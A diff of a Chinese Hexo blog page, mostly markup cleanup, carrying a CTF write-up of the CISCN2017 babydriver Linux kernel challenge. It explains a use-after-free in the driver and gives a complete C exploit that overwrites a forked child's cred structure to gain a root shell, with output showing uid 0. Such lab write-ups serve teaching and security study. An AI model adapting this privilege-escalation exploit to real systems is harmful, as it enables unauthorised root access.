@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
 <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
@@ -24,8 +24,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -44,7 +44,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
 
 
@@ -52,9 +52,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
@@ -72,7 +72,7 @@
 
 
 
-  <meta name="keywords" content="pwn,kernel," />
+  <meta name="keywords" content="pwn,kernel,">
 
 
 
@@ -126,7 +126,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/01/08/kernel-pwn-CISCN2017-babydriver/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/01/08/kernel-pwn-CISCN2017-babydriver/">
 
 
 
@@ -164,7 +164,7 @@
   <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
-<a href="https://github.com/hacker-mao" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<a href="https://github.com/hacker-mao" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
@@ -172,7 +172,7 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">1mpossible</span>
         <span class="logo-line-after"><i></i></span>
@@ -202,7 +202,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
           </a>
@@ -212,7 +212,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
             标签
           </a>
@@ -222,7 +222,7 @@
         <li class="menu-item menu-item-categories">
           <a href="/categories/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
             
             分类
           </a>
@@ -232,7 +232,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
             归档
           </a>
@@ -275,7 +275,7 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="D4rk3r">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content>
       <meta itemprop="image" content="/images/head.jpg">
     </span>
 
@@ -311,7 +311,7 @@
           </span>
 
           
-            <span class="post-category" >
+            <span class="post-category">
             
               <span class="post-meta-divider">|</span>
             
@@ -425,14 +425,17 @@
 <li>所以先新建一个文件夹，然后解压文件系统映像</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir fs</span><br><span class="line">cd fs</span><br><span class="line">cp ../rootfs.cpio ./</span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li>然后查看init文件的内容，可以知道babydriver.ko就是我们需要分析的漏洞驱动，将它用ida打开</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&apos; &apos; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
+
 <ol start="4">
 <li>分析babydrive.ko</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">//释放babydev_struct</span><br><span class="line">int __fastcall babyrelease(inode *inode, file *filp)</span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(&quot;device release\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//申请一块大小为 0x40 字节的空间，地址存储在全局变量babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len</span><br><span class="line">int __fastcall babyopen(inode *inode, file *filp)</span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL);</span><br><span class="line">  babydev_struct.device_buf_len = 64LL;</span><br><span class="line">  printk(&quot;device open\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//定义了 0x10001 的命令，可以释放全局变量 babydev_struct中的device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len</span><br><span class="line">__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v3; // rdx</span><br><span class="line">  size_t v4; // rbx</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  if ( command == 65537 )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(&quot;alloc done\n&quot;);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB);</span><br><span class="line">    result = -22LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//从 buffer 拷贝到全局变量中</span><br><span class="line">ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v4; // rdx</span><br><span class="line">  ssize_t result; // rax</span><br><span class="line">  ssize_t v6; // rbx</span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  if ( !babydev_struct.device_buf )</span><br><span class="line">    return -1LL;</span><br><span class="line">  result = -2LL;</span><br><span class="line">  if ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//从全局变量拷贝到 buffer 中</span><br><span class="line">ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v4; // rdx</span><br><span class="line">  ssize_t result; // rax</span><br><span class="line">  ssize_t v6; // rbx</span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  if ( !babydev_struct.device_buf )</span><br><span class="line">    return -1LL;</span><br><span class="line">  result = -2LL;</span><br><span class="line">  if ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li><p>由于baby_struct.device是全局的，因此只能存在一个，所以当我们open 2个设备的时候，第二次open的会覆盖第一次的，我们再释放第一次打开的，这时候第二次打开的设备也会被释放，就存在UAF，然后通过ioctl改变大小，使得和cred结构大小一样再fork一个进程，它的cred结构体被放进这个UAF的空间，然后我们能够控制这个cred结构体，通过write写入uid，达到getshell。</p>
 </li>
@@ -442,33 +445,41 @@
 </li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">struct cred &#123;</span><br><span class="line">	atomic_t	usage; 4</span><br><span class="line">#ifdef CONFIG_DEBUG_CREDENTIALS</span><br><span class="line">	atomic_t	subscribers;	/* number of processes subscribed */</span><br><span class="line">	void		*put_addr;</span><br><span class="line">	unsigned	magic;</span><br><span class="line">#define CRED_MAGIC	0x43736564</span><br><span class="line">#define CRED_MAGIC_DEAD	0x44656144</span><br><span class="line">#endif</span><br><span class="line">	kuid_t		uid;		/* real UID of the task */ 4</span><br><span class="line">	kgid_t		gid;		/* real GID of the task */ 4</span><br><span class="line">	kuid_t		suid;		/* saved UID of the task */ 4</span><br><span class="line">	kgid_t		sgid;		/* saved GID of the task */ 4</span><br><span class="line">	kuid_t		euid;		/* effective UID of the task */ 4</span><br><span class="line">	kgid_t		egid;		/* effective GID of the task */ 4</span><br><span class="line">	kuid_t		fsuid;		/* UID for VFS ops */ 4</span><br><span class="line">	kgid_t		fsgid;		/* GID for VFS ops */ 4</span><br><span class="line">	unsigned	securebits;	/* SUID-less security management */ 4</span><br><span class="line">	kernel_cap_t	cap_inheritable; /* caps our children can inherit */ 4  </span><br><span class="line">	kernel_cap_t	cap_permitted;	/* caps we&apos;re permitted */ 4</span><br><span class="line">	kernel_cap_t	cap_effective;	/* caps we can actually use */ 4</span><br><span class="line">	kernel_cap_t	cap_bset;	/* capability bounding set */ 4</span><br><span class="line">	kernel_cap_t	cap_ambient;	/* Ambient capability set */ 4</span><br><span class="line">#ifdef CONFIG_KEYS</span><br><span class="line">	unsigned char	jit_keyring;	/* default keyring to attach requested </span><br><span class="line">					 * keys to */ 1</span><br><span class="line">	struct key __rcu *session_keyring; /* keyring inherited over fork */</span><br><span class="line">	struct key	*process_keyring; /* keyring private to this process */</span><br><span class="line">	struct key	*thread_keyring; /* keyring private to this thread */</span><br><span class="line">	struct key	*request_key_auth; /* assumed request_key authority */</span><br><span class="line">#endif</span><br><span class="line">#ifdef CONFIG_SECURITY</span><br><span class="line">	void		*security;	/* subjective LSM security */ 8</span><br><span class="line">#endif</span><br><span class="line">	struct user_struct *user;	/* real user ID subscription */</span><br><span class="line">	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */</span><br><span class="line">	struct group_info *group_info;	/* supplementary groups for euid/fsgid */</span><br><span class="line">	struct rcu_head	rcu;		/* RCU deletion hook */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li>方法二是自己写个简单modules然后printf一下sizeof(struct cred)就能知道了</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//简单modules</span><br><span class="line">#include &lt;linux/init.h&gt;</span><br><span class="line">#include &lt;linux/module.h&gt;</span><br><span class="line">#include &lt;linux/kernel.h&gt;</span><br><span class="line">#include &lt;linux/cred.h&gt;</span><br><span class="line">MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);</span><br><span class="line">struct cred c1;</span><br><span class="line">static int hello_init(void) </span><br><span class="line">&#123;</span><br><span class="line">    printk(&quot;&lt;1&gt; Hello world!\n&quot;);</span><br><span class="line">    printk(&quot;size of cred : %d \n&quot;,sizeof(c1));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">static void hello_exit(void) </span><br><span class="line">&#123;</span><br><span class="line">    printk(&quot;&lt;1&gt; Bye, cruel world\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/5808046-83bc1baa724f670f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-83bc1baa724f670f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <ol start="6">
 <li><p>利用思路</p>
 </li>
 <li><p>open两次设备</p>
 </li>
-<li>利用babyioctl将结构体改为0xa8 sizeof(struct cred)</li>
-<li>释放第一个设备，造成UAF</li>
-<li>fork一个子进程来控制cred结构体</li>
+<li><p>利用babyioctl将结构体改为0xa8 sizeof(struct cred)</p>
+</li>
+<li><p>释放第一个设备，造成UAF</p>
+</li>
+<li><p>fork一个子进程来控制cred结构体</p>
+</li>
 <li><p>将结构体的xid置为0</p>
 </li>
 <li><p>编写exp:</p>
 </li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">//gcc exp.c -static -o exp</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stropts.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int fd1 = open(&quot;/dev/babydev&quot;,2);</span><br><span class="line">	int fd2 = open(&quot;/dev/babydev&quot;,2);</span><br><span class="line"></span><br><span class="line">	ioctl(fd1,65537,0xa8);</span><br><span class="line"></span><br><span class="line">	close(fd1);</span><br><span class="line"></span><br><span class="line">	int pid = fork();</span><br><span class="line"></span><br><span class="line">	if(pid &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		puts(&quot;[*] fork error!&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	else if (pid == 0)</span><br><span class="line">	&#123;</span><br><span class="line">		int buf[9]=&#123;0&#125;;</span><br><span class="line">        write(fd2,buf,28);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		wait(NULL);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <ol start="8">
 <li>静态编译exp，并将编译好的exp放入解压的fs目录下，重新打包fs系统</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; rootfs.cpio</span><br></pre></td></tr></table></figure>
+
 <ol start="9">
 <li>启动系统，运行exp</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./boot.sh</span><br><span class="line">/ $ ./exp</span><br><span class="line">[    4.998456] device open</span><br><span class="line">[    4.999472] device open</span><br><span class="line">[    5.000418] alloc done</span><br><span class="line">[    5.001826] device release</span><br><span class="line">/ # id</span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br></pre></td></tr></table></figure>
+
 <p>参考文章：</p>
 <ul>
 <li><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86490</a></li>
@@ -510,9 +521,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/pwn/" <i class="fa fa-tag"></i> pwn</a>
+            <a href="/tags/pwn/" <i class="fa fa-tag"> pwn</a>
           
-            <a href="/tags/kernel/" <i class="fa fa-tag"></i> kernel</a>
+            <a href="/tags/kernel/" <i class="fa fa-tag"> kernel</a>
           
         </div>
       
@@ -597,9 +608,7 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image"
-                src="/images/head.jpg"
-                alt="D4rk3r" />
+              <img class="site-author-image" itemprop="image" src="/images/head.jpg" alt="D4rk3r">
             
               <p class="site-author-name" itemprop="name">D4rk3r</p>
               <p class="site-description motion-element" itemprop="description">Impossible -> I'm possible</p>
@@ -744,7 +753,7 @@
 
         
       </div>
-    </footer>
+    </div></footer>
 
     
       <div class="back-to-top">
@@ -1032,7 +1041,7 @@
 
   
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/Epsilon2.1.model.json"},"display":{"position":"right","width":300,"height":400},"mobile":{"show":true},"log":false});</script></body>
 </html>
 
 
